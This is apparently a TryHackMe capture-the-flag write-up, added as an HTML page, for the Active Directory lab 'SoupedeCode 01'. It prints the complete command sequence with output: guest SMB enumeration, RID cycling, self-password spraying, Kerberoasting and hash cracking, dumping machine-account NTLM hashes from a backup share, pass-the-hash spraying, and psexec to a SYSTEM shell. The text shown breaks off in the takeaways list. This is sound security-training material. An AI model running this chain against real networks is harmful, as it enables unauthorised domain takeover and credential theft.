@@ -1,0 +1,619 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SoupedeCode 01 — Breach Reconstruction Log</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=VT323&family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;1,400&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:            #03100a;
+    --bg-terminal:   #061b11;
+    --bg-inset:      #07140d;
+    --bg-inset-2:    #0a1f14;
+    --border:        #134a2c;
+    --border-dim:    #0c2a1a;
+    --green:         #46ffa0;     /* bright phosphor — headers, prompts */
+    --green-soft:    #9fe8bd;     /* body text */
+    --green-dim:     #3f7a5c;     /* muted / comments / timestamps */
+    --amber:         #ffb454;     /* warnings, flag, emphasis */
+    --red:           #ff6b6b;     /* failures */
+    --white-ish:     #d9fbe8;
+    --glow: 0 0 6px rgba(70,255,160,.45);
+    --font-display: 'VT323', monospace;
+    --font-mono: 'JetBrains Mono', ui-monospace, 'SFMono-Regular', Menlo, Consolas, monospace;
+  }
+
+  *{box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  @media (prefers-reduced-motion: reduce){ html{scroll-behavior:auto;} *{animation:none !important; transition:none !important;} }
+
+  body{
+    margin:0;
+    background:var(--bg);
+    color:var(--green-soft);
+    font-family:var(--font-mono);
+    font-size:15.5px;
+    line-height:1.65;
+    -webkit-font-smoothing:antialiased;
+  }
+
+  ::selection{ background:var(--green); color:#03100a; }
+
+  a{ color:var(--green); text-decoration:none; border-bottom:1px solid var(--border); }
+  a:hover{ color:var(--white-ish); border-color:var(--green); text-shadow:var(--glow); }
+  a:focus-visible, button:focus-visible{ outline:2px solid var(--green); outline-offset:3px; }
+
+  /* ambient CRT texture */
+  .crt-overlay{
+    position:fixed; inset:0; pointer-events:none; z-index:80;
+    background:
+      repeating-linear-gradient(to bottom, rgba(0,0,0,0) 0px, rgba(0,0,0,0) 2px, rgba(70,255,160,.022) 3px, rgba(70,255,160,.022) 4px),
+      radial-gradient(ellipse at 50% 0%, rgba(70,255,160,.05), transparent 60%);
+    mix-blend-mode:overlay;
+  }
+  .flicker{ animation:flicker 9s infinite; }
+  @keyframes flicker{
+    0%,93%,100%{ filter:brightness(1); }
+    94%{ filter:brightness(1.03); }
+    95%{ filter:brightness(.985); }
+    96%{ filter:brightness(1.015); }
+  }
+
+  .visually-hidden{ position:absolute; width:1px; height:1px; overflow:hidden; clip:rect(0 0 0 0); }
+
+  /* ---------- shell / titlebar ---------- */
+  .terminal-shell{ max-width:1180px; margin:0 auto; padding:0 0 6rem; }
+
+  .term-titlebar{
+    position:sticky; top:0; z-index:60;
+    display:flex; align-items:center; gap:.9rem;
+    padding:.65rem 1.25rem;
+    background:rgba(6,27,17,.92);
+    border-bottom:1px solid var(--border);
+    backdrop-filter:blur(6px);
+    font-size:13px;
+  }
+  .term-titlebar .dots{ display:flex; gap:6px; flex-shrink:0;}
+  .term-titlebar .dots span{ width:11px; height:11px; border-radius:50%; display:block; background:var(--border-dim); border:1px solid var(--border);}
+  .term-path{ color:var(--green-dim); flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+  .term-status{ display:flex; align-items:center; gap:.45rem; color:var(--green-dim); flex-shrink:0; }
+  .dot-live{ width:7px; height:7px; border-radius:50%; background:var(--green); box-shadow:var(--glow); animation:pulse 1.6s ease-in-out infinite; }
+  @keyframes pulse{ 0%,100%{opacity:1;} 50%{opacity:.35;} }
+
+  /* ---------- hero ---------- */
+  .hero{
+    padding:5.5rem 1.5rem 4rem;
+    text-align:center;
+    border-bottom:1px solid var(--border-dim);
+    background:
+      radial-gradient(ellipse 60% 50% at 50% 0%, rgba(70,255,160,.08), transparent 70%);
+  }
+  .hero-eyebrow{
+    font-size:12.5px; letter-spacing:.35em; text-transform:uppercase;
+    color:var(--green-dim); margin:0 0 1.6rem;
+  }
+  .hero-eyebrow::before{ content:"[ "; } .hero-eyebrow::after{ content:" ]"; }
+
+  .hero-frame{
+    display:inline-block; position:relative; padding:1.6rem 2.4rem;
+  }
+  .hero-frame::before, .hero-frame::after{
+    content:""; position:absolute; width:22px; height:22px; border:2px solid var(--green); opacity:.6;
+  }
+  .hero-frame::before{ top:0; left:0; border-right:none; border-bottom:none; }
+  .hero-frame::after{ bottom:0; right:0; border-left:none; border-top:none; }
+
+  .hero h1{
+    font-family:var(--font-display);
+    font-size:clamp(3rem, 9vw, 6.2rem);
+    line-height:.95;
+    letter-spacing:.04em;
+    margin:0;
+    color:var(--green);
+    text-shadow:0 0 18px rgba(70,255,160,.5), 0 0 2px rgba(70,255,160,.8);
+  }
+  .hero h1 small{ display:block; font-size:.32em; letter-spacing:.5em; color:var(--white-ish); text-shadow:none; margin-top:.3em; }
+
+  .hero-typed{
+    margin:1.9rem auto 0; max-width:46em;
+    color:var(--green-soft); font-size:1.02rem; min-height:1.6em;
+  }
+  .cursor{ display:inline-block; width:.55em; background:var(--green); margin-left:2px; box-shadow:var(--glow); animation:blink 1s steps(1) infinite; }
+  @keyframes blink{ 50%{ opacity:0; } }
+
+  .hero-meta{
+    display:flex; flex-wrap:wrap; justify-content:center; gap:.6rem 1rem;
+    margin-top:2.2rem; font-size:12.5px; color:var(--green-dim);
+  }
+  .hero-meta span{ border:1px solid var(--border); padding:.3rem .7rem; border-radius:2px; background:var(--bg-inset); }
+  .hero-meta span b{ color:var(--green-soft); font-weight:600; }
+
+  .scroll-cue{ display:inline-block; margin-top:2.6rem; font-size:12px; color:var(--green-dim); border:none; }
+  .scroll-cue:hover{ color:var(--green); border:none; }
+
+  /* ---------- layout ---------- */
+  .layout{ display:grid; grid-template-columns:230px 1fr; gap:0; align-items:start; }
+
+  .sidenav{
+    position:sticky; top:52px; align-self:start;
+    padding:2.4rem 1.2rem 2rem 1.5rem;
+    border-right:1px solid var(--border-dim);
+    height:calc(100vh - 52px); overflow-y:auto;
+  }
+  .nav-prompt{ color:var(--green-dim); font-size:12px; margin-bottom:1rem; white-space:pre-line; }
+  .sidenav ul{ list-style:none; margin:0; padding:0; }
+  .sidenav li{ margin:0; }
+  .sidenav a{
+    display:block; padding:.32rem 0; border:none; font-size:13px;
+    color:var(--green-dim); white-space:nowrap; overflow:hidden; text-overflow:ellipsis;
+    border-left:2px solid transparent; padding-left:.7rem; margin-left:-.7rem;
+  }
+  .sidenav a:before{ content:"· "; }
+  .sidenav a:hover{ color:var(--green); border-color:var(--border); }
+  .sidenav a.active{ color:var(--green); border-left-color:var(--green); text-shadow:var(--glow); }
+
+  .content{ padding:3rem clamp(1.25rem, 4vw, 3.5rem) 0; min-width:0; }
+
+  /* ---------- blocks / prompt headers ---------- */
+  .block{ margin-bottom:4rem; scroll-margin-top:70px; }
+  .prompt-header{
+    font-size:13px; color:var(--green-dim); margin-bottom:1.1rem; white-space:pre-line;
+  }
+  .prompt-header .path{ color:var(--green-dim); }
+  .prompt-header .cmd{ color:var(--white-ish); }
+  .prompt-header b{ color:var(--green); font-weight:600; }
+
+  .block h2{
+    font-family:var(--font-display); font-weight:400; letter-spacing:.02em;
+    font-size:2.1rem; margin:0 0 1.1rem; color:var(--white-ish);
+    display:flex; align-items:baseline; gap:.7rem;
+  }
+  .block h2 .act{ color:var(--green); font-size:.55em; letter-spacing:.18em; }
+
+  .block-body p{ margin:0 0 1.1rem; color:var(--green-soft); }
+  .block-body p:last-child{ margin-bottom:0; }
+  .block-body strong{ color:var(--white-ish); font-weight:600; }
+  .block-body code{ background:var(--bg-inset-2); color:var(--amber); padding:.1em .35em; border-radius:3px; font-size:.92em; }
+
+  pre{
+    margin:1rem 0 1.4rem; padding:1rem 1.15rem; overflow-x:auto;
+    background:var(--bg-inset); border:1px solid var(--border-dim); border-left:3px solid var(--border);
+    border-radius:4px; font-size:13px; line-height:1.55; color:var(--green-soft);
+  }
+  pre.cmd{ border-left-color:var(--green); }
+  pre code{ background:none; padding:0; color:inherit; }
+  .ok{ color:var(--green); text-shadow:var(--glow); }
+  .fail{ color:var(--red); }
+  .warn{ color:var(--amber); }
+  .dim{ color:var(--green-dim); }
+  .tag{ color:var(--white-ish); }
+
+  table{ width:100%; border-collapse:collapse; margin:1.2rem 0 1.6rem; font-size:13.5px; }
+  th,td{ text-align:left; padding:.5rem .8rem; border:1px solid var(--border-dim); }
+  th{ color:var(--green); font-weight:600; background:var(--bg-inset); }
+
+  .credential{
+    display:inline-block; margin:.3rem 0 .6rem; padding:.5rem .9rem;
+    border:1px dashed var(--green); border-radius:3px; background:var(--bg-inset-2);
+    color:var(--amber); font-weight:600; text-shadow:0 0 8px rgba(255,180,84,.35);
+  }
+
+  .callout{
+    border:1px solid var(--border); border-left:3px solid var(--amber);
+    background:var(--bg-inset); padding:.9rem 1.1rem; margin:1rem 0 1.6rem; border-radius:4px;
+  }
+  .callout p{ margin:0; }
+  .callout .label{ color:var(--amber); font-weight:600; }
+
+  /* flag */
+  .flag-block{
+    text-align:center; margin:2rem 0; padding:2rem 1.2rem;
+    border:1px solid var(--green); border-radius:6px; background:var(--bg-inset-2);
+    box-shadow:0 0 30px rgba(70,255,160,.08) inset;
+  }
+  .flag-block .label{ font-size:12px; letter-spacing:.3em; color:var(--green-dim); margin-bottom:.8rem; }
+  .flag-block code{
+    font-size:clamp(.95rem,2.4vw,1.3rem); color:var(--green); background:none; padding:0;
+    text-shadow:0 0 12px rgba(70,255,160,.6); word-break:break-all;
+  }
+
+  /* attack chain diagram */
+  .chain pre{ font-size:13px; color:var(--green-soft); }
+  .chain .node{ color:var(--white-ish); }
+
+  /* arsenal listing */
+  .arsenal pre{ font-size:13px; }
+  .arsenal .perm{ color:var(--green-dim); }
+  .arsenal .name{ color:var(--green); }
+  .arsenal .desc{ color:var(--green-soft); }
+
+  /* takeaways */
+  .takeaways ul{ list-style:none; margin:0; padding:0; }
+  .takeaways li{
+    padding:.9rem 1rem .9rem 2.3rem; margin-bottom:.8rem; position:relative;
+    border:1px solid var(--border-dim); border-left:3px solid var(--red); border-radius:4px;
+    background:var(--bg-inset);
+  }
+  .takeaways li::before{ content:"[!]"; position:absolute; left:.8rem; color:var(--red); font-weight:600; }
+  .takeaways strong{ color:var(--white-ish); }
+
+  /* footer */
+  .term-footer{
+    margin-top:1rem; padding:3rem clamp(1.25rem,4vw,3.5rem) 1rem; border-top:1px solid var(--border-dim);
+  }
+  .term-footer p{ color:var(--green-dim); font-size:13px; }
+  .term-footer .prompt-header{ margin-bottom:.6rem; }
+
+  /* responsive */
+  @media (max-width:900px){
+    .layout{ grid-template-columns:1fr; }
+    .sidenav{
+      position:static; height:auto; border-right:none; border-bottom:1px solid var(--border-dim);
+      padding:1rem 1.25rem;
+    }
+    .nav-prompt{ display:none; }
+    .sidenav ul{ display:flex; gap:1rem; overflow-x:auto; padding-bottom:.3rem; }
+    .sidenav a{ padding-left:0; margin-left:0; border-left:none; border-bottom:2px solid transparent; }
+    .sidenav a.active{ border-left:none; border-bottom-color:var(--green); }
+    .content{ padding-top:2rem; }
+  }
+</style>
+</head>
+<body class="flicker">
+<div class="crt-overlay" aria-hidden="true"></div>
+
+<div class="terminal-shell">
+
+  <header class="term-titlebar">
+    <div class="dots"><span></span><span></span><span></span></div>
+    <a href="../index.html" style="border:none;color:var(--green-dim);flex-shrink:0;">&larr; ./home</a>
+    <div class="term-path">root@dc01:~/soupedecode01#</div>
+    <div class="term-status"><span class="dot-live" aria-hidden="true"></span> SESSION ACTIVE</div>
+  </header>
+
+  <section class="hero" id="top">
+    <p class="hero-eyebrow">breach reconstruction log</p>
+    <div class="hero-frame">
+      <h1>SOUPEDECODE<br>01<small>TryHackMe · Active Directory</small></h1>
+    </div>
+    <p class="hero-typed" id="heroTyped" aria-live="polite"></p>
+    <div class="hero-meta">
+      <span>DOMAIN <b>SOUPEDECODE.LOCAL</b></span>
+      <span>DC <b>DC01</b></span>
+      <span>OS <b>Windows Server 2022</b></span>
+      <span>RESULT <b style="color:var(--amber)">ROOT FLAG CAPTURED</b></span>
+    </div>
+    <a class="scroll-cue" href="#tldr">▼ scroll to begin</a>
+  </section>
+
+  <div class="layout">
+    <nav class="sidenav" aria-label="Section navigation">
+      <div class="nav-prompt">┌──(reader@you)-[~]
+└─$ ls -la sections/</div>
+      <ul id="navList">
+        <li><a href="#tldr">00_tldr.md</a></li>
+        <li><a href="#environment">00_env.cfg</a></li>
+        <li><a href="#recon">01_recon.sh</a></li>
+        <li><a href="#smb">02_smb_enum.sh</a></li>
+        <li><a href="#users">03_user_enum.sh</a></li>
+        <li><a href="#spray">04_pw_spray.md</a></li>
+        <li><a href="#kerberoast">05_kerberoast.sh</a></li>
+        <li><a href="#backup">06_backup_share.sh</a></li>
+        <li><a href="#pth">07_pth_spray.sh</a></li>
+        <li><a href="#shell">08_psexec.sh</a></li>
+        <li><a href="#chain">attack_chain.txt</a></li>
+        <li><a href="#arsenal">arsenal/</a></li>
+        <li><a href="#takeaways">takeaways.md</a></li>
+      </ul>
+    </nav>
+
+    <main class="content">
+      <section id="tldr" class="block">
+        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
+└─$ <span class="cmd">cat 00_tldr.md</span></div>
+        <h2><span class="act">// 00</span>tl;dr</h2>
+        <div class="block-body">
+          <p>Another Active Directory box, another chain that never touches a single exploit: a <strong>Guest SMB session</strong> (not a blank null session — the literal username <code>anonymous</code>) gets share enumeration for free. <strong>RID cycling</strong> off that session dumps the entire domain user list, no LDAP bind required. <strong>Spraying that list against itself</strong> (username == password) lands one account. That account is enough to <strong>Kerberoast</strong> five service accounts, and one TGS hash cracks instantly. The cracked account unlocks a <strong>backup share</strong> holding raw NTLM hashes for ten machine accounts — and <strong>pass-the-hash spraying</strong> those finds one that's local admin on the box.</p>
+        </div>
+      </section>
+
+      <section id="environment" class="block">
+        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
+└─$ <span class="cmd">cat 00_env.cfg</span></div>
+        <h2><span class="act">// 00</span>environment</h2>
+        <table>
+          <tr><th>domain</th><td>SOUPEDECODE.LOCAL</td></tr>
+          <tr><th>domain controller</th><td>DC01</td></tr>
+          <tr><th>os</th><td>Windows Server 2022 (Build 20348)</td></tr>
+          <tr><th>attack box</th><td>Kali Linux</td></tr>
+        </table>
+        <div class="callout">
+          <p><span class="label">[!] note</span> — TryHackMe VM restarts reassign the target's IP mid-engagement, so three different addresses show up across this writeup (<code>10.10.38.114</code> → <code>10.10.35.233</code> → <code>10.10.158.163</code>). Same box throughout, just reconnects between sessions.</p>
+        </div>
+      </section>
+
+      <section id="recon" class="block">
+        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
+└─$ <span class="cmd">cat 01_recon.sh</span></div>
+        <h2><span class="act">// 01</span>reconnaissance</h2>
+        <div class="block-body"><p>A quick targeted check on 88 confirmed the obvious before the full scan even finished.</p></div>
+        <pre class="cmd"><code>$ nmap -sCV -p88 10.10.38.114</code></pre>
+        <pre><code>88/tcp open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-05 18:30:05Z)</code></pre>
+        <div class="block-body"><p>Domain Controller, confirmed. Then the full sweep:</p></div>
+        <pre class="cmd"><code>$ nmap -sCV -p- -vvv 10.10.38.114</code></pre>
+        <pre><code>PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Active Directory LDAP (Domain: SOUPEDECODE.LOCAL)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Global Catalog (Domain: SOUPEDECODE.LOCAL)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+9389/tcp  open  mc-nmf        .NET Message Framing</code></pre>
+        <div class="block-body"><p>The RDP cert and <code>rdp-ntlm-info</code> confirm the hostname — <code>DC01.SOUPEDECODE.LOCAL</code> — straight into <code>/etc/hosts</code>.</p></div>
+      </section>
+
+      <section id="smb" class="block">
+        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
+└─$ <span class="cmd">cat 02_smb_enum.sh</span></div>
+        <h2><span class="act">// 02</span>smb enumeration — guest beats null</h2>
+        <div class="block-body"><p>The usual null session was a dead end.</p></div>
+        <pre class="cmd"><code>$ nxc smb 10.10.38.114 -u '' -p '' --shares</code></pre>
+        <pre><code><span class="fail">[-]</span> SOUPEDECODE.LOCAL\: STATUS_ACCESS_DENIED</code></pre>
+        <div class="block-body"><p>So was a guessed <code>admin</code> with a blank password. But the literal username <code>anonymous</code> with a blank password authenticated as Guest:</p></div>
+        <pre class="cmd"><code>$ nxc smb 10.10.38.114 -u 'anonymous' -p '' --shares</code></pre>
+        <pre><code>SMB   10.10.38.114   445   DC01   <span class="ok">[+]</span> SOUPEDECODE.LOCAL\anonymous: (Guest)
+SMB   10.10.38.114   445   DC01   Share      Permissions   Remark
+SMB   10.10.38.114   445   DC01   ADMIN$                   Remote Admin
+SMB   10.10.38.114   445   DC01   <span class="tag">backup</span>                   
+SMB   10.10.38.114   445   DC01   C$                        Default share
+SMB   10.10.38.114   445   DC01   IPC$       READ           Remote IPC
+SMB   10.10.38.114   445   DC01   NETLOGON                  Logon server share
+SMB   10.10.38.114   445   DC01   SYSVOL                    Logon server share
+SMB   10.10.38.114   445   DC01   Users                     </code></pre>
+        <div class="block-body"><p>A share called <code>backup</code> with no listed permissions immediately stands out — but at this point Guest can't actually read it, and <code>Users</code> is locked down too. Filed away for later.</p></div>
+      </section>
+
+      <section id="users" class="block">
+        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
+└─$ <span class="cmd">cat 03_user_enum.sh</span></div>
+        <h2><span class="act">// 03</span>enumerating every domain user</h2>
+        <div class="block-body"><p><code>kerbrute</code> confirmed a handful of usernames first.</p></div>
+        <pre class="cmd"><code>$ ./kerbrute userenum -d soupedecode.local /usr/share/wordlists/userlist.txt --dc 10.10.38.114</code></pre>
+        <pre><code><span class="ok">[+]</span> VALID USERNAME: admin@soupedecode.local
+<span class="ok">[+]</span> VALID USERNAME: charlie@soupedecode.local
+<span class="ok">[+]</span> VALID USERNAME: guest@soupedecode.local
+<span class="ok">[+]</span> VALID USERNAME: administrator@soupedecode.local</code></pre>
+        <div class="block-body"><p>A start — but the real haul came from <strong>RID cycling</strong>: walking the SID space of an authenticated (even Guest) SMB session to enumerate every account by RID, no wordlist required. Metasploit's <code>smb_lookupsid</code> module did the job.</p></div>
+        <pre class="cmd"><code>msf6 > use auxiliary/scanner/smb/smb_lookupsid
+msf6 auxiliary(scanner/smb/smb_lookupsid) > set RHOSTS 10.10.35.233
+msf6 auxiliary(scanner/smb/smb_lookupsid) > set SMBUser Guest
+msf6 auxiliary(scanner/smb/smb_lookupsid) > exploit</code></pre>
+        <pre><code><span class="dim">[*]</span> USER=Administrator RID=500
+<span class="dim">[*]</span> USER=Guest RID=501
+<span class="dim">[*]</span> USER=krbtgt RID=502
+<span class="dim">[*]</span> USER=DC01$ RID=1000
+<span class="dim">[*]</span> USER=bmark0 RID=1103
+<span class="dim">[*]</span> USER=otara1 RID=1104
+<span class="dim">...</span>
+<span class="dim">[*]</span> USER=<span class="tag">ybob317</span> RID=1132
+<span class="dim">[*]</span> USER=<span class="tag">file_svc</span> RID=1133
+<span class="dim">[*]</span> USER=charlie RID=1134</code></pre>
+        <div class="block-body"><p>Cross-checked with <code>impacket-lookupsid</code> for good measure — same ~30-account list, including the service account <code>file_svc</code> and an oddly-named regular user, <code>ybob317</code>, that turned out to matter a lot.</p></div>
+      </section>
+
+      <section id="spray" class="block">
+        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
+└─$ <span class="cmd">cat 04_pw_spray.md</span></div>
+        <h2><span class="act">// 04</span>spraying the user list against itself</h2>
+        <div class="block-body"><p>With a full username list in hand, the next move is the classic AD anti-pattern check: spray every username as its own password. It landed one hit:</p></div>
+        <div class="credential">ybob317 : ybob317</div>
+        <div class="block-body"><p>Username-as-password is still depressingly common, and it was the key that unlocked everything that followed.</p></div>
+      </section>
+
+      <section id="kerberoast" class="block">
+        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
+└─$ <span class="cmd">cat 05_kerberoast.sh</span></div>
+        <h2><span class="act">// 05</span>kerberoasting</h2>
+        <div class="block-body"><p><code>ybob317</code>'s credentials are nothing special on their own, but they're enough to authenticate to LDAP and request TGS tickets for any account with a <code>servicePrincipalName</code>.</p></div>
+        <pre class="cmd"><code>$ impacket-GetUserSPNs soupedecode.local/ybob317:ybob317 -dc-ip 10.10.158.163 -request</code></pre>
+        <pre><code>ServicePrincipalName    Name             PasswordLastSet
+----------------------  ---------------  --------------------------
+FTP/FileServer          file_svc         2024-06-17 17:32:23
+FW/ProxyServer          firewall_svc     2024-06-17 17:28:32
+HTTP/BackupServer       backup_svc       2024-06-17 17:28:49
+HTTP/WebServer          web_svc          2024-06-17 17:29:04
+HTTPS/MonitoringServer  monitoring_svc   2024-06-17 17:29:18
+
+$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$soupedecode.local/file_svc*$... <span class="dim">[truncated]</span></code></pre>
+        <div class="block-body"><p>Five Kerberoastable accounts, five TGS hashes. Straight into hashcat:</p></div>
+        <pre class="cmd"><code>$ hashcat -m 13100 file_svc.hash rockyou.txt</code></pre>
+        <pre><code>$krb5tgs$23$*file_svc$...:<span class="ok">Password123!!</span></code></pre>
+        <div class="credential">file_svc : Password123!!</div>
+        <div class="block-body"><p>"Complex" by a policy checklist's standards, gone in seconds against a wordlist.</p></div>
+      </section>
+
+      <section id="backup" class="block">
+        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
+└─$ <span class="cmd">cat 06_backup_share.sh</span></div>
+        <h2><span class="act">// 06</span>the backup share opens up</h2>
+        <pre class="cmd"><code>$ nxc smb 10.10.158.163 -u 'file_svc' -p 'Password123!!' --shares</code></pre>
+        <pre><code>SMB   10.10.158.163   445   DC01   <span class="ok">[+]</span> SOUPEDECODE.LOCAL\file_svc:Password123!!
+SMB   10.10.158.163   445   DC01   Share     Permissions   Remark
+SMB   10.10.158.163   445   DC01   <span class="tag">backup</span>    READ          
+SMB   10.10.158.163   445   DC01   NETLOGON  READ          
+SMB   10.10.158.163   445   DC01   SYSVOL    READ          </code></pre>
+        <div class="block-body"><p>The <code>backup</code> share that Guest couldn't touch is now readable. Inside, a single file:</p></div>
+        <pre class="cmd"><code>$ smbclient //10.10.158.163/backup -U 'file_svc' -p 'Password123!!'
+smb: \&gt; get backup_extract.txt</code></pre>
+        <pre><code>WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
+DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
+CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
+<span class="tag">FileServer$</span>:2065:aad3b435b51404eeaad3b435b51404ee:<span class="warn">e41da7e79a4c76dbd9cf79d1cb325559</span>:::
+MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
+BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
+ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
+PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
+ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
+MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::</code></pre>
+        <div class="block-body"><p>A raw NTLM dump for <strong>ten machine accounts</strong>, sitting on a share gated by nothing but a Kerberoastable service account's password.</p></div>
+      </section>
+
+      <section id="pth" class="block">
+        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
+└─$ <span class="cmd">cat 07_pth_spray.sh</span></div>
+        <h2><span class="act">// 07</span>pass-the-hash spraying</h2>
+        <div class="block-body"><p>Split the dump into matched username/hash lists:</p></div>
+        <pre class="cmd"><code>$ cat backup_extract.txt | cut -d ':' -f 1 &gt; extracted_users.txt
+$ cat backup_extract.txt | cut -d ':' -f 4 | awk '{print "00000000000000000000000000000000:"$1}' &gt; extracted_hashes.txt</code></pre>
+        <div class="block-body"><p>Then sprayed each machine account against its own hash:</p></div>
+        <pre class="cmd"><code>$ nxc smb 10.10.158.163 -u extracted_users.txt -H extracted_hashes.txt --no-bruteforce</code></pre>
+        <pre><code>SMB   10.10.158.163   445   DC01   <span class="fail">[-]</span> SOUPEDECODE.LOCAL\WebServer$:...      STATUS_LOGON_FAILURE
+SMB   10.10.158.163   445   DC01   <span class="fail">[-]</span> SOUPEDECODE.LOCAL\DatabaseServer$:... STATUS_LOGON_FAILURE
+SMB   10.10.158.163   445   DC01   <span class="fail">[-]</span> SOUPEDECODE.LOCAL\CitrixServer$:...   STATUS_LOGON_FAILURE
+SMB   10.10.158.163   445   DC01   <span class="ok">[+]</span> SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 <span class="warn">(Pwn3d!)</span></code></pre>
+        <div class="block-body"><p><code>FileServer$</code>'s own machine-account hash is valid for local admin on the box.</p></div>
+      </section>
+
+      <section id="shell" class="block">
+        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
+└─$ <span class="cmd">cat 08_psexec.sh</span></div>
+        <h2><span class="act">// 08</span>pass-the-hash to a shell</h2>
+        <pre class="cmd"><code>$ impacket-psexec 'FileServer$'@10.10.158.163 -hashes 'aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559'</code></pre>
+        <pre><code><span class="dim">[*]</span> Found writable share ADMIN$
+<span class="dim">[*]</span> Uploading file oNwqLrAm.exe
+<span class="dim">[*]</span> Starting service jZDT.....
+
+C:\Windows\system32&gt; cd ..\..
+C:\&gt; cd Users\Administrator\Desktop
+C:\Users\Administrator\Desktop&gt; dir
+06/17/2024  10:41 AM    &lt;DIR&gt;          backup
+07/25/2025  10:51 AM                33 root.txt
+
+C:\Users\Administrator\Desktop&gt; type root.txt</code></pre>
+
+        <div class="flag-block">
+          <div class="label">root flag captured (partial capture)</div>
+          <code>27cb2be302c...</code>
+        </div>
+        <div class="block-body"><p>The capture cuts off mid-string here — same 33-byte file, full value lives in the original terminal scrollback.</p></div>
+      </section>
+
+      <section id="chain" class="block chain">
+        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
+└─$ <span class="cmd">cat attack_chain.txt</span></div>
+        <h2>full attack chain</h2>
+        <pre><code><span class="node">Guest SMB session</span> ("anonymous" / blank password)
+   │
+   ▼
+RID cycling (smb_lookupsid / lookupsid.py) → full domain user list
+   │
+   ▼
+Password spray username == password → <span class="node">ybob317</span> : ybob317
+   │
+   ▼
+Kerberoast 5 SPN accounts → crack <span class="node">file_svc</span> → Password123!!
+   │
+   ▼
+file_svc unlocks "backup" share → backup_extract.txt (10 machine NTLM hashes)
+   │
+   ▼
+Pass-the-hash spray each machine account against its own hash
+   │
+   ▼
+<span class="node">FileServer$</span> hash → local admin (Pwn3d!)
+   │
+   ▼
+impacket-psexec → SYSTEM shell → <span style="color:var(--amber)">root.txt</span></code></pre>
+      </section>
+
+      <section id="arsenal" class="block arsenal">
+        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
+└─$ <span class="cmd">ls -la /opt/arsenal/</span></div>
+        <h2>tools used</h2>
+        <pre><code><span class="perm">-rwxr-xr-x</span>  <span class="name">nmap</span>                   <span class="desc">recon</span>
+<span class="perm">-rwxr-xr-x</span>  <span class="name">netexec (nxc)</span>          <span class="desc">SMB enum, RID cycling, hash spraying, share checks</span>
+<span class="perm">-rwxr-xr-x</span>  <span class="name">kerbrute</span>               <span class="desc">username enumeration</span>
+<span class="perm">-rwxr-xr-x</span>  <span class="name">msfconsole / smb_lookupsid</span> <span class="desc">RID-cycle user enumeration</span>
+<span class="perm">-rwxr-xr-x</span>  <span class="name">impacket-lookupsid</span>     <span class="desc">RID-cycle cross-check</span>
+<span class="perm">-rwxr-xr-x</span>  <span class="name">impacket-GetUserSPNs</span>   <span class="desc">Kerberoasting</span>
+<span class="perm">-rwxr-xr-x</span>  <span class="name">hashcat</span>                <span class="desc">offline TGS hash cracking</span>
+<span class="perm">-rwxr-xr-x</span>  <span class="name">smbclient</span>              <span class="desc">share browsing &amp; file retrieval</span>
+<span class="perm">-rwxr-xr-x</span>  <span class="name">impacket-psexec</span>        <span class="desc">pass-the-hash remote execution</span></code></pre>
+      </section>
+
+      <section id="takeaways" class="block takeaways">
+        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
+└─$ <span class="cmd">cat takeaways.md</span></div>
+        <h2>key takeaways</h2>
+        <ul>
+          <li><strong>Guest beats null.</strong> When a blank-credential null session gets STATUS_ACCESS_DENIED, try the literal username <code>anonymous</code> (or <code>guest</code>) with a blank password before giving up on unauthenticated SMB.</li>
+          <li><strong>RID cycling needs nothing but an authenticated session.</strong> No LDAP bind, no valid domain credentials beyond Guest — the entire user list, service accounts included, is enumerable by walking RIDs.</li>
+          <li><strong>Username == password is still real.</strong> A full user list is also a free password-spray wordlist against itself, and it works often enough to be worth trying first.</li>
